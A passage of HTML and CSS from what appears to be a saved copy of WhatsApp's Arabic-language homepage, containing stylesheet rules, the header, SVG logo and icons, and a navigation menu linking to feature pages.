    margin-right: 12px;
    line-height: 44px;
    /*padding: 14px 14px 14px 14px;*/
    text-transform: uppercase;
    white-space: nowrap;
    background-color: #128c7e;
    color: #fff;
}
}
._2yz0 ._2z07 {
   
}
body { 
    width: 100%;
    height: 100%;
    }
._2yz0 ._2y_c {
   border-radius: 5px;
    display: inline-block;
    font-size: 12px;
    height: 21px;
    font-weight: 500;
    /*letter-spacing: .071em;*/
    line-height: 19px;
    padding: 1px 9px;
    margin-right: -93px;
    text-transform: uppercase;
    white-space: nowrap;
}
    :focus{
        outline:none;
    }
._2yz0 ._2z07 {
    background-color: #128c7e;
    color: #fff!important;
}

.button_a {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
    border-radius: 5px;
    display: inline-block;
    font-size: 12px;
    font-weight: 500;
    height: 44px;
    width: 113px;
    letter-spacing: .071em;
    margin-right: 12px;
    line-height: 46px;
    /* padding: 14px 14px 14px 14px; */
    text-transform: uppercase;
    white-space: nowrap;
    background-color: #128c7e;
    color: #fff;
}
._2yz0 ._2y_d label, ._2yz0 ._2y_d input, ._2yz0 ._2y_d button {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
    width: 147px;
    height: 26px;
    padding: 10px;
    line-height: 11px;
   /* font-size: 14px;*/
}
._2yz0 ._2z07 {
    background-color: #128c7e;
    color: #fff!important;
}


  </style>
<body id="top-of-page" class="_2yz0 _9sca _af-3 _aiux  ar chrome webkit win x1 Locale_ar_AR" dir="rtl">
    <script type="text/javascript"
        nonce="">requireLazy(["bootstrapWebSession"], function (j) { j(1682414539) })</script>
    <div data-testid="whatsapp_www_full_page" class="_2ywh _li _9kh2" style="visibility: hidden">
        <div class="_2y_d _9rxy">
            <div class="_adhc"><a href="#content-wrapper" class="_aeal _9vcv" rel="noopener"><span
                        class="_advp _aeam">تخطي إلى المحتوى</span></a>
                <header class="_af-2 _afwk" data-testid="whatsapp_www_header" id="u_0_0_cE">
                    <div class="_afvx">
                        <div class="_afvy">
                            <div class="_af8g"><button aria-label="فتح قائمة الهاتف المحمول" class="_afvu _ain3 _9vcv"
                                    id="u_0_1_7V"><span class="_advp _aeam"><svg width="25" height="33"
                                            viewBox="0 0 25 33" fill="none" class="_wauiIcon__hamburgerMenuRebrand">
                                            <line x1="1.04297" y1="12.75" x2="23.543" y2="12.75" stroke="currentColor"
                                                stroke-width="1.5" stroke-linecap="round"></line>
                                            <line x1="1.04297" y1="16.75" x2="23.543" y2="16.75" stroke="currentColor"
                                                stroke-width="1.5" stroke-linecap="round"></line>
                                            <line x1="1.04297" y1="20.75" x2="23.543" y2="20.75" stroke="currentColor"
                                                stroke-width="1.5" stroke-linecap="round"></line>
                                        </svg></span></button>
                                <nav class="_9t0g" id="u_0_2_uv"><svg width="101" height="22" viewBox="0 0 101 22"
                                        fill="none" class="_af87 _9t0j" xmlns="http://www.w3.org/2000/svg">
                                        <g clip-path="url(#clip0_4057_1490)">
                                            <path
                                                d="M39.9672 12.7979H39.9378L38.0929 5.5H35.87L33.9867 12.7095H33.9563L32.2524 5.50442H29.8828L32.741 16.0887H35.1456L36.9442 8.8847H36.9747L38.8049 16.0887H41.1644L44.0632 5.50442H41.7342L39.9672 12.7979ZM51.3063 9.08484C51.079 8.80102 50.7793 8.58095 50.4375 8.44682C49.9861 8.28004 49.5057 8.20226 49.0236 8.21793C48.5915 8.22441 48.1667 8.32846 47.7824 8.52201C47.3438 8.73736 46.9802 9.07519 46.7375 9.49286H46.6923V5.50442H44.5484V16.0887H46.6923V12.0715C46.6923 11.2908 46.8232 10.7298 47.085 10.3885C47.3468 10.0472 47.7703 9.87693 48.3556 9.87766C48.869 9.87766 49.2278 10.0336 49.4287 10.3454C49.6295 10.6572 49.7311 11.1283 49.7311 11.7608V16.0887H51.875V11.3748C51.8783 10.9393 51.8352 10.5046 51.7464 10.0778C51.6766 9.71894 51.5263 9.37976 51.3063 9.08484ZM60.1528 14.3825V10.4018C60.1528 9.93664 60.0471 9.56326 59.8358 9.28166C59.6236 8.99813 59.3434 8.77025 59.0199 8.61822C58.6711 8.45612 58.2982 8.34902 57.9153 8.30086C57.5193 8.247 57.1201 8.21967 56.7203 8.21904C56.2857 8.21856 55.8522 8.26042 55.426 8.34399C55.0186 8.41981 54.6272 8.56262 54.2683 8.76639C53.9282 8.96066 53.6386 9.22935 53.422 9.55147C53.1859 9.92121 53.055 10.3461 53.0429 10.7822H55.1868C55.2274 10.3675 55.3696 10.0701 55.6111 9.89757C55.8526 9.72507 56.1911 9.62776 56.6154 9.62776C56.7947 9.62695 56.9738 9.63915 57.1513 9.66425C57.3063 9.68442 57.4555 9.7348 57.5903 9.81242C57.7178 9.88786 57.8223 9.99558 57.8927 10.1242C57.9759 10.2924 58.0147 10.4783 58.0055 10.665C58.0166 10.7571 58.0044 10.8505 57.9702 10.9371C57.936 11.0236 57.8807 11.1006 57.8092 11.1614C57.6386 11.2884 57.4412 11.3765 57.2315 11.4191C56.9581 11.4842 56.6801 11.529 56.3998 11.5529C56.0861 11.5831 55.7687 11.6225 55.4475 11.6712C55.1239 11.7211 54.8033 11.7883 54.4872 11.8724C54.1846 11.949 53.8978 12.0766 53.6398 12.2495C53.3869 12.4249 53.1793 12.6559 53.0339 12.924C52.8663 13.2578 52.786 13.6271 52.8003 13.9988C52.791 14.3503 52.8607 14.6995 53.0045 15.0216C53.1324 15.2994 53.3258 15.5435 53.5687 15.7337C53.8198 15.9259 54.1075 16.0669 54.415 16.1484C54.7549 16.2401 55.1062 16.2851 55.4588 16.2822C55.9401 16.2822 56.4188 16.2125 56.8794 16.0754C57.3398 15.9383 57.7567 15.6878 58.0902 15.3478C58.0997 15.4748 58.1174 15.6011 58.1432 15.726C58.1679 15.8488 58.2007 15.97 58.2414 16.0887H60.4191C60.2988 15.8687 60.2266 15.6265 60.207 15.3777C60.1677 15.0474 60.1496 14.715 60.1528 14.3825ZM58.0089 13.1219C58.0065 13.2807 57.9941 13.4391 57.9717 13.5963C57.9434 13.8029 57.874 14.002 57.7674 14.1823C57.6424 14.3885 57.4652 14.5595 57.2529 14.6788C57.022 14.8174 56.6943 14.8867 56.2701 14.8867C56.1027 14.8869 55.9358 14.8717 55.7713 14.8414C55.6214 14.8163 55.4778 14.7634 55.3482 14.6855C55.2266 14.6113 55.1272 14.5067 55.0604 14.3825C54.9857 14.2354 54.9492 14.0724 54.9544 13.9081C54.9482 13.7388 54.9847 13.5706 55.0604 13.4183C55.1284 13.2931 55.224 13.1843 55.3403 13.0998C55.4643 13.0116 55.6023 12.944 55.7488 12.8997C55.9047 12.8503 56.0638 12.8108 56.2249 12.7814C56.3964 12.7526 56.5635 12.7261 56.7383 12.7073C56.9132 12.6885 57.0769 12.6619 57.2303 12.6332C57.3789 12.6055 57.5255 12.5686 57.6693 12.5226C57.794 12.4848 57.9093 12.4219 58.0078 12.338L58.0089 13.1219ZM64.1642 6.12585H62.0203V8.42471H60.7136V9.83343H62.0135V14.3548C61.9994 14.677 62.0669 14.9976 62.2099 15.2881C62.3322 15.5183 62.5184 15.7099 62.747 15.841C62.9913 15.9752 63.2593 16.063 63.5369 16.0997C63.8495 16.145 64.1652 16.1672 64.4813 16.1661C64.6946 16.1661 64.9101 16.1661 65.1324 16.1517C65.3351 16.1442 65.5371 16.1242 65.7372 16.092V14.4577C65.6322 14.4794 65.526 14.4946 65.419 14.503C65.3062 14.513 65.1933 14.5185 65.0715 14.5185C64.7093 14.5185 64.4666 14.4577 64.3448 14.3394C64.2229 14.221 64.1642 13.9844 64.1642 13.6284V9.83343H65.7372V8.42471H64.1609L64.1642 6.12585ZM73.0412 12.7294C72.9004 12.489 72.7079 12.2815 72.477 12.1212C72.2347 11.9531 71.9686 11.8205 71.6872 11.7276C71.3904 11.6303 71.0846 11.5462 70.7721 11.4766C70.4595 11.4069 70.1729 11.3428 69.8806 11.2842C69.617 11.2322 69.3567 11.1653 69.1009 11.084C68.8998 11.0236 68.7128 10.9252 68.5503 10.7943C68.4816 10.7387 68.4267 10.6685 68.39 10.589C68.3532 10.5094 68.3355 10.4227 68.3381 10.3354C68.3301 10.2004 68.3717 10.067 68.4555 9.95949C68.535 9.86413 68.6363 9.78838 68.7511 9.73834C68.8738 9.68781 69.0035 9.65539 69.1359 9.64214C69.2672 9.63067 69.399 9.62588 69.5308 9.62776C69.8769 9.61913 70.2199 9.69274 70.5306 9.84228C70.8116 9.98492 70.9684 10.2591 70.9977 10.665H73.0401C73.0181 10.2476 72.8905 9.84215 72.6689 9.48512C72.4705 9.18134 72.2043 8.92573 71.8903 8.73764C71.5618 8.54356 71.2007 8.40804 70.824 8.33735C70.4187 8.25746 70.0063 8.21782 69.5929 8.21904C69.1766 8.21856 68.7611 8.25557 68.3517 8.32961C67.9689 8.39644 67.6006 8.52696 67.2628 8.71552C66.9424 8.89543 66.6743 9.15277 66.4842 9.46301C66.2738 9.83422 66.1719 10.2551 66.1897 10.6793C66.1801 10.9771 66.2534 11.2718 66.4018 11.5319C66.5429 11.7639 66.7358 11.9617 66.966 12.1102C67.2105 12.269 67.4763 12.3936 67.7559 12.4806C68.0527 12.5746 68.3584 12.6564 68.6699 12.725C69.2785 12.8405 69.8778 12.9994 70.4629 13.2004C70.8917 13.3575 71.1061 13.5945 71.1061 13.9114C71.1128 14.0773 71.0649 14.2409 70.9695 14.3781C70.8804 14.5001 70.7648 14.6013 70.631 14.6744C70.4897 14.7505 70.3376 14.8053 70.1797 14.837C70.0233 14.8713 69.8637 14.8891 69.7035 14.89C69.4973 14.8904 69.2918 14.8655 69.0919 14.8159C68.9051 14.7705 68.7282 14.6926 68.5695 14.5859C68.4172 14.4809 68.2904 14.3442 68.1982 14.1857C68.0989 14.006 68.0495 13.8039 68.0549 13.5996H66.0058C66.0079 14.0503 66.1304 14.4925 66.3612 14.8823C66.5702 15.2155 66.8548 15.4971 67.1928 15.705C67.5488 15.9187 67.9409 16.0684 68.3505 16.1473C68.7877 16.2371 69.2332 16.2819 69.6798 16.2811C70.1193 16.2815 70.5577 16.2393 70.9887 16.155C71.3942 16.0787 71.7815 15.9286 72.1306 15.7127C72.4906 15.4941 72.7842 15.1849 72.9808 14.8173C73.1775 14.4498 73.2701 14.0373 73.2489 13.6228C73.2589 13.3128 73.1862 13.0056 73.0379 12.7316L73.0412 12.7294ZM77.3054 5.50221L73.2229 16.0864H75.6117L76.4591 13.7301H80.4965L81.3123 16.0864H83.7789L79.7382 5.50442L77.3054 5.50221ZM77.0797 11.9952L78.4868 8.11178H78.5162L79.8781 11.9952H77.0797ZM91.1958 9.46301C90.901 9.08458 90.5236 8.77554 90.0911 8.5585C89.5984 8.32016 89.0539 8.20326 88.5046 8.21793C88.0449 8.2122 87.5897 8.3082 87.1731 8.49879C86.7585 8.6995 86.4132 9.01519 86.1801 9.40661H86.1497V8.42471H84.1073V18.7723H86.2512V15.141H86.2806C86.5324 15.5079 86.88 15.8019 87.2871 15.9925C87.7049 16.1874 88.1626 16.2865 88.6253 16.2822C89.1467 16.2919 89.6627 16.1781 90.1295 15.9504C90.5492 15.7399 90.9161 15.4408 91.2037 15.0747C91.4968 14.6981 91.715 14.2709 91.8469 13.8152C91.9883 13.3336 92.0593 12.8347 92.0579 12.3335C92.0596 11.8051 91.9886 11.2788 91.8469 10.7689C91.7168 10.2969 91.4958 9.85367 91.1958 9.46301ZM89.8203 13.1839C89.7669 13.4585 89.6617 13.7211 89.51 13.9579C89.2538 14.3106 88.8755 14.56 88.4456 14.6597C88.0157 14.7594 87.5634 14.7025 87.1731 14.4997C86.9377 14.3673 86.738 14.1815 86.5909 13.9579C86.4384 13.7207 86.331 13.4585 86.2738 13.1839C86.2078 12.8871 86.1749 12.5842 86.1756 12.2805C86.1746 11.9717 86.2045 11.6635 86.2648 11.3605C86.3191 11.0821 86.4246 10.8157 86.5762 10.5743C86.721 10.3486 86.9177 10.1593 87.1506 10.0214C87.4184 9.86766 87.725 9.79102 88.0352 9.80026C88.3403 9.7922 88.6415 9.86887 88.9041 10.0214C89.1398 10.1625 89.3391 10.3552 89.4863 10.5842C89.642 10.8274 89.7521 11.0959 89.8113 11.3771C89.8774 11.6746 89.9103 11.9782 89.9095 12.2827C89.9112 12.585 89.8829 12.8869 89.8248 13.1839H89.8203ZM100.406 10.7744C100.277 10.3003 100.056 9.85506 99.7546 9.46301C99.4602 9.08463 99.0831 8.77558 98.651 8.5585C98.1579 8.32033 97.613 8.20343 97.0634 8.21793C96.6041 8.21255 96.1494 8.30855 95.733 8.49879C95.3183 8.69981 94.9728 9.01539 94.7389 9.40661H94.7096V8.42471H92.6627V18.7723H94.8066V15.141H94.8371C95.0888 15.5076 95.4359 15.8016 95.8425 15.9925C96.2603 16.1874 96.718 16.2865 97.1808 16.2822C97.7024 16.2919 98.2188 16.1781 98.686 15.9504C99.1054 15.7398 99.4719 15.4407 99.7591 15.0747C100.052 14.6981 100.27 14.2709 100.402 13.8152C100.545 13.3337 100.616 12.8348 100.614 12.3335C100.618 11.8072 100.55 11.2827 100.41 10.7744H100.406ZM98.3746 13.1839C98.3217 13.4587 98.2165 13.7213 98.0643 13.9579C97.9058 14.1956 97.6894 14.3909 97.4345 14.5261C97.1797 14.6612 96.8945 14.732 96.6047 14.732C96.3149 14.732 96.0297 14.6612 95.7749 14.5261C95.5201 14.3909 95.3036 14.1956 95.1452 13.9579C94.9931 13.7205 94.8857 13.4584 94.8281 13.1839C94.7626 12.887 94.7297 12.5842 94.7299 12.2805C94.7293 11.9716 94.7595 11.6635 94.8202 11.3605C94.8787 11.0812 94.9888 10.8147 95.1452 10.5743C95.2906 10.3491 95.4872 10.1599 95.7195 10.0214C95.9873 9.86766 96.2939 9.79102 96.6042 9.80026C96.9093 9.79208 97.2105 9.86876 97.473 10.0214C97.7091 10.1625 97.9088 10.3551 98.0564 10.5842C98.2121 10.8274 98.3222 11.0959 98.3814 11.3771C98.4475 11.6746 98.4804 11.9782 98.4795 12.2827C98.4776 12.5854 98.4454 12.8872 98.3836 13.1839H98.3746Z"
                                                fill="currentColor"></path>
                                            <path
                                                d="M25.9306 10.5046C25.8259 7.69499 24.6176 5.0336 22.5581 3.07618C20.4986 1.11877 17.7471 0.0166645 14.8781 3.00753e-06H14.8239C12.8918 -0.00140293 10.9927 0.490142 9.31337 1.42627C7.63402 2.3624 6.23232 3.71085 5.24619 5.33895C4.26006 6.96705 3.72348 8.8187 3.68925 10.7117C3.65501 12.6047 4.12431 14.4738 5.05095 16.1351L4.067 21.9049C4.0654 21.9167 4.06639 21.9288 4.0699 21.9402C4.07342 21.9516 4.07937 21.9622 4.08738 21.9712C4.09539 21.9802 4.10526 21.9874 4.11634 21.9924C4.12742 21.9974 4.13945 22 4.15163 22H4.16856L9.99215 20.7306C11.4968 21.4385 13.1446 21.8059 14.8137 21.8054C14.9198 21.8054 15.0259 21.8054 15.1319 21.8054C16.6002 21.7643 18.0456 21.4387 19.3847 20.8474C20.7238 20.256 21.9302 19.4106 22.9342 18.36C23.9381 17.3093 24.7198 16.0742 25.2341 14.726C25.7484 13.3777 25.9851 11.943 25.9306 10.5046ZM15.0766 19.909C14.9886 19.909 14.9006 19.909 14.8137 19.909C13.3386 19.9108 11.8846 19.5649 10.5744 18.9006L10.2765 18.748L6.32716 19.6624L7.05609 15.747L6.88683 15.4661C6.07843 14.1155 5.64301 12.5818 5.62344 11.0161C5.60386 9.4504 6.00083 7.90671 6.77522 6.53707C7.54962 5.16743 8.67474 4.0191 10.0398 3.20516C11.4048 2.39123 12.9626 1.93977 14.5598 1.89526C14.6486 1.89526 14.7378 1.89526 14.8273 1.89526C17.2388 1.90226 19.551 2.83733 21.2657 4.49898C22.9803 6.16064 23.9603 8.41588 23.9943 10.7788C24.0283 13.1417 23.1138 15.4232 21.4476 17.1316C19.7815 18.84 17.4972 19.8386 15.0868 19.9123L15.0766 19.909Z"
                                                fill="currentColor"></path>
                                            <path
                                                d="M10.946 5.6393C10.8086 5.64193 10.673 5.67157 10.5474 5.72646C10.4218 5.78135 10.3087 5.86038 10.2149 5.95887C9.94968 6.22535 9.20833 6.86669 9.16546 8.21349C9.12258 9.56029 10.0828 10.8927 10.2171 11.0796C10.3514 11.2665 12.053 14.1757 14.8559 15.3555C16.5033 16.051 17.2255 16.1705 17.6938 16.1705C17.8867 16.1705 18.0323 16.1506 18.1846 16.1417C18.698 16.1108 19.8569 15.5291 20.1097 14.8966C20.3624 14.2642 20.3793 13.7113 20.3128 13.6007C20.2462 13.4901 20.0634 13.4105 19.7881 13.269C19.5127 13.1274 18.1621 12.4198 17.9082 12.3202C17.814 12.2773 17.7127 12.2514 17.6092 12.2439C17.5417 12.2474 17.4761 12.2669 17.4181 12.3009C17.3601 12.3348 17.3114 12.382 17.2763 12.4386C17.0506 12.7139 16.5327 13.3121 16.3589 13.4846C16.3209 13.5275 16.2742 13.562 16.2217 13.586C16.1692 13.61 16.1122 13.6229 16.0542 13.6239C15.9475 13.6193 15.8431 13.5918 15.7484 13.5432C14.9303 13.2027 14.1844 12.7152 13.5492 12.1057C12.9558 11.5326 12.4523 10.8764 12.0552 10.1585C11.9018 9.87985 12.0552 9.73611 12.1952 9.60563C12.3351 9.47515 12.4852 9.29491 12.6296 9.139C12.7481 9.00582 12.8469 8.85692 12.923 8.6967C12.9624 8.62234 12.9823 8.53955 12.9809 8.45578C12.9795 8.37201 12.9569 8.28989 12.9151 8.21681C12.8485 8.07748 12.3509 6.70746 12.1173 6.1579C11.9277 5.68796 11.7021 5.67248 11.5046 5.6581C11.3421 5.64704 11.1559 5.64152 10.9697 5.63599H10.946"
                                                fill="currentColor"></path>
                                        </g>
                                        <defs>
                                            <clipPath id="clip0_4057_1490">
                                                <rect width="100" height="22" fill="white" transform="translate(0.5)">
                                                </rect>
                                            </clipPath>
                                        </defs>
                                    </svg><button aria-label="إغلاق قائمة الهاتف المحمول" class="_9t0i _ain3 _9vcv"
                                        id="u_0_3_bs"><span class="_advp _aeam"><svg width="16" height="16" fill="none"
                                                class="_9s6z">
                                                <path fill-rule="evenodd" clip-rule="evenodd"
                                                    d="M15.495 1.353L14.364.222 7.859 6.727 1.637.505.507 1.636l6.22 6.222-6.505 6.506 1.131 1.131L7.86 8.99l6.79 6.79 1.13-1.132-6.788-6.79 6.504-6.504z"
                                                    fill="currentColor"></path>
                                            </svg></span></button>
                                    <ul class="_9t0k _a4cd">
                                        <li class="_9t0h"><a href="https://www.whatsapp.com/" class="_aeo9 _9vcv"><span
                                                    class="_advp _aeam">الصفحة الرئيسية</span></a></li>
                                        <li class="_9t0h">
                                            <div class="_9wm7 _aedf">
                                                <ul id="u_0_4_U+">
                                                    <li class="_9wma"><button class="_aily _9wm9" aria-expanded="false"
                                                            aria-selected="false"><svg fill="currentColor" width="16"
                                                                height="17" viewBox="0 0 16 17"
                                                                xmlns="http://www.w3.org/2000/svg"
                                                                class="_wauiIcon__plus _aede">
                                                                <g clip-path="url(#clip0_1842_81860)">
                                                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                                                        d="M16.002 8.50042C16.002 8.0862 15.6662 7.75042 15.252 7.75042L8.7514 7.75042L8.7514 1.25042C8.7514 0.836205 8.41562 0.500418 8.0014 0.500418C7.58719 0.500418 7.2514 0.836205 7.2514 1.25042L7.2514 7.75042L0.752014 7.75042C0.337801 7.75042 0.00201378 8.0862 0.00201363 8.50042C0.00201415 8.91463 0.337801 9.25042 0.752014 9.25042L7.2514 9.25042L7.2514 15.7504C7.2514 16.1646 7.58719 16.5004 8.0014 16.5004C8.41562 16.5004 8.7514 16.1646 8.7514 15.7504L8.7514 9.25042L15.252 9.25042C15.6662 9.25042 16.002 8.91463 16.002 8.50042Z"
                                                                        fill="#currentColor"></path>
                                                                </g>
                                                                <defs>
                                                                    <clipPath id="clip0_1842_81860">
                                                                        <rect width="16" height="16" fill="white"
                                                                            transform="translate(0 0.5)"></rect>
                                                                    </clipPath>
                                                                </defs>
                                                            </svg><svg fill="currentColor" width="16" height="3"
                                                                viewBox="0 0 16 3" xmlns="http://www.w3.org/2000/svg"
                                                                class="_wauiIcon__minus _aedd">
                                                                <path
                                                                    d="M15.2518 0.750113C15.666 0.750113 16.0018 1.0859 16.0018 1.50011C16.0018 1.91433 15.666 2.25011 15.2518 2.25011H0.751831C0.337618 2.25011 0.00183158 1.91433 0.00183105 1.50011C0.0018312 1.0859 0.337617 0.750113 0.751831 0.750113H15.2518Z"
                                                                    fill="currentColor"></path>
                                                            </svg>
                                                            <h3 class="_9vd5 _9sc- _9t31 _9wm8">الخصائص</h3>
                                                        </button>
                                                        <div class="_9wm6" aria-hidden="true" role="tabpanel"
                                                            data-maxheight="240">
                                                            <div class="_9wn9"><a
                                                                    href="https://www.whatsapp.com/privacy"
                                                                    class="_9vd5 _aens _afod" target="_self"><span
                                                                        class="_afoi"><svg width="16" height="21"
                                                                            viewBox="0 0 16 21" fill="none"
                                                                            xmlns="http://www.w3.org/2000/svg"
                                                                            class="_wauiIcon__privacy _afoj">
                                                                            <path
                                                                                d="M14 7H13V5C13 2.24 10.76 0 8 0C5.24 0 3 2.24 3 5V7H2C0.9 7 0 7.9 0 9V19C0 20.1 0.9 21 2 21H14C15.1 21 16 20.1 16 19V9C16 7.9 15.1 7 14 7ZM8 16C6.9 16 6 15.1 6 14C6 12.9 6.9 12 8 12C9.1 12 10 12.9 10 14C10 15.1 9.1 16 8 16ZM5 7V5C5 3.34 6.34 2 8 2C9.66 2 11 3.34 11 5V7H5Z"
                                                                                fill="currentColor"></path>
                                                                        </svg></span><span><span class="_afog"><span
                                                                                class="_9vg3 _aj1b" style="">المراسلة
                                                                                بخصوصية تامة</span></span><svg
                                                                            width="15" height="13" fill="none"
                                                                            class="_wauiIcon__arrow _agnt _afok">
                                                                            <path fill-rule="evenodd"
                                                                                clip-rule="evenodd"
                                                                                d="M.31 6.432a.75.75 0 01.75-.75h10.932L8.387 2.076a.75.75 0 011.06-1.06l4.94 4.939a.75.75 0 01-.024 1.083.664.664 0 01-.022.024l-5.247 5.247a.75.75 0 11-1.06-1.061l4.065-4.066H1.061a.75.75 0 01-.75-.75z"
                                                                                fill="currentColor"></path>
                                                                        </svg></span></a><a
                                                                    href="https://www.whatsapp.com/stayconnected"
                                                                    class="_9vd5 _aens _afod" target="_self"><span
                                                                        class="_afoi"><svg width="20" height="20"
                                                                            fill="none"
                                                                            xmlns="http://www.w3.org/2000/svg"
                                                                            class="_wauiIcon__globe-alt _afoj">
                                                                            <path
                                                                                d="M10 0C4.48 0 0 4.48 0 10s4.48 10 10 10 10-4.48 10-10S15.52 0 10 0ZM9 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L7 13v1c0 1.1.9 2 2 2v1.93Zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H6V8h2c.55 0 1-.45 1-1V5h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39Z"
                                                                                fill="currentColor"></path>
                                                                        </svg></span><span><span class="_afog"><span
                                                                                class="_9vg3 _aj1b" style="">البقاء على
                                                                                اتصال</span></span><svg width="15"
                                                                            height="13" fill="none"
                                                                            class="_wauiIcon__arrow _agnt _afok">
                                                                            <path fill-rule="evenodd"
                                                                                clip-rule="evenodd"
                                                                                d="M.31 6.432a.75.75 0 01.75-.75h10.932L8.387 2.076a.75.75 0 011.06-1.06l4.94 4.939a.75.75 0 01-.024 1.083.664.664 0 01-.022.024l-5.247 5.247a.75.75 0 11-1.06-1.061l4.065-4.066H1.061a.75.75 0 01-.75-.75z"
                                                                                fill="currentColor"></path>
                                                                        </svg></span></a><a
                                                                    href="https://www.whatsapp.com/community"
                                                                    class="_9vd5 _aens _afod" target="_self"><span
                                                                        class="_afoi"><svg width="24" height="13"
                                                                            viewBox="0 0 24 13" fill="none"
                                                                            xmlns="http://www.w3.org/2000/svg"
                                                                            class="_wauiIcon__communities _afoj">
                                                                            <path
                                                                                d="M7.00049 5H5.00049V3C5.00049 2.45 4.55049 2 4.00049 2C3.45049 2 3.00049 2.45 3.00049 3V5H1.00049C0.450488 5 0.000488281 5.45 0.000488281 6C0.000488281 6.55 0.450488 7 1.00049 7H3.00049V9C3.00049 9.55 3.45049 10 4.00049 10C4.55049 10 5.00049 9.55 5.00049 9V7H7.00049C7.55049 7 8.00049 6.55 8.00049 6C8.00049 5.45 7.55049 5 7.00049 5ZM18.0005 6C19.6605 6 20.9905 4.66 20.9905 3C20.9905 1.34 19.6605 0 18.0005 0C17.6805 0 17.3705 0.0499999 17.0905 0.14C17.6605 0.95 17.9905 1.93 17.9905 3C17.9905 4.07 17.6505 5.04 17.0905 5.86C17.3705 5.95 17.6805 6 18.0005 6ZM13.0005 6C14.6605 6 15.9905 4.66 15.9905 3C15.9905 1.34 14.6605 0 13.0005 0C11.3405 0 10.0005 1.34 10.0005 3C10.0005 4.66 11.3405 6 13.0005 6ZM13.0005 8C11.0005 8 7.00049 9 7.00049 11V12C7.00049 12.55 7.45049 13 8.00049 13H18.0005C18.5505 13 19.0005 12.55 19.0005 12V11C19.0005 9 15.0005 8 13.0005 8ZM19.6205 8.16C20.4505 8.89 21.0005 9.82 21.0005 11V12.5C21.0005 12.67 20.9805 12.84 20.9505 13H23.5005C23.7805 13 24.0005 12.78 24.0005 12.5V11C24.0005 9.46 21.6305 8.51 19.6205 8.16Z"
                                                                                fill="currentColor"></path>
                                                                        </svg></span><span><span class="_afog"><span
                                                                                class="_9vg3 _aj1b" style="">بناء
                                                                                مجتمع</span></span><svg width="15"
                                                                            height="13" fill="none"
                                                                            class="_wauiIcon__arrow _agnt _afok">
                                                                            <path fill-rule="evenodd"
                                                                                clip-rule="evenodd"
                                                                                d="M.31 6.432a.75.75 0 01.75-.75h10.932L8.387 2.076a.75.75 0 011.06-1.06l4.94 4.939a.75.75 0 01-.024 1.083.664.664 0 01-.022.024l-5.247 5.247a.75.75 0 11-1.06-1.061l4.065-4.066H1.061a.75.75 0 01-.75-.75z"
                                                                                fill="currentColor"></path>
                                                                        </svg></span></a><a
                                                                    href="https://www.whatsapp.com/expressyourself"
                                                                    class="_9vd5 _aens _afod" target="_self"><span
                                                                        class="_afoi"><svg width="18" height="18"
                                                                            viewBox="0 0 18 18" fill="none"
                                                                            xmlns="http://www.w3.org/2000/svg"
                                                                            class="_wauiIcon__smileFace _afoj">
                                                                            <path
                                                                                d="M8.99149 0C4.02349 0 0.000488281 4.032 0.000488281 9C0.000488281 13.968 4.02349 18 8.99149 18C13.9685 18 18.0005 13.968 18.0005 9C18.0005 4.032 13.9685 0 8.99149 0ZM5.85049 5.4C6.59749 5.4 7.20049 6.003 7.20049 6.75C7.20049 7.497 6.59749 8.1 5.85049 8.1C5.10349 8.1 4.50049 7.497 4.50049 6.75C4.50049 6.003 5.10349 5.4 5.85049 5.4ZM13.2395 11.448C12.4205 13.203 10.8365 14.4 9.00049 14.4C7.16449 14.4 5.58049 13.203 4.76149 11.448C4.61749 11.151 4.83349 10.8 5.16649 10.8H12.8345C13.1675 10.8 13.3835 11.151 13.2395 11.448ZM12.1505 8.1C11.4035 8.1 10.8005 7.497 10.8005 6.75C10.8005 6.003 11.4035 5.4 12.1505 5.4C12.8975 5.4 13.5005 6.003 13.5005 6.75C13.5005 7.497 12.8975 8.1 12.1505 8.1Z"
                                                                                fill="currentColor"></path>
                                                                        </svg></span><span><span class="_afog"><span
                                                                                class="_9vg3 _aj1b" style="">التعبير عن
                                                                                نفسك</span></span><svg width="15"
                                                                            height="13" fill="none"
                                                                            class="_wauiIcon__arrow _agnt _afok">
                                                                            <path fill-rule="evenodd"
                                                                                clip-rule="evenodd"
                                                                                d="M.31 6.432a.75.75 0 01.75-.75h10.932L8.387 2.076a.75.75 0 011.06-1.06l4.94 4.939a.75.75 0 01-.024 1.083.664.664 0 01-.022.024l-5.247 5.247a.75.75 0 11-1.06-1.061l4.065-4.066H1.061a.75.75 0 01-.75-.75z"
                                                                                fill="currentColor"></path>
                                                                        </svg></span></a><a
                                                                    href="https://business.whatsapp.com/"
                                                                    class="_9vd5 _aens _afod" target="_self"><span
                                                                        class="_afoi"><svg width="20" height="18"
                                                                            viewBox="0 0 20 18" fill="none"
                                                                            xmlns="http://www.w3.org/2000/svg"
                                                                            class="_wauiIcon__store _afoj">
                                                                            <path
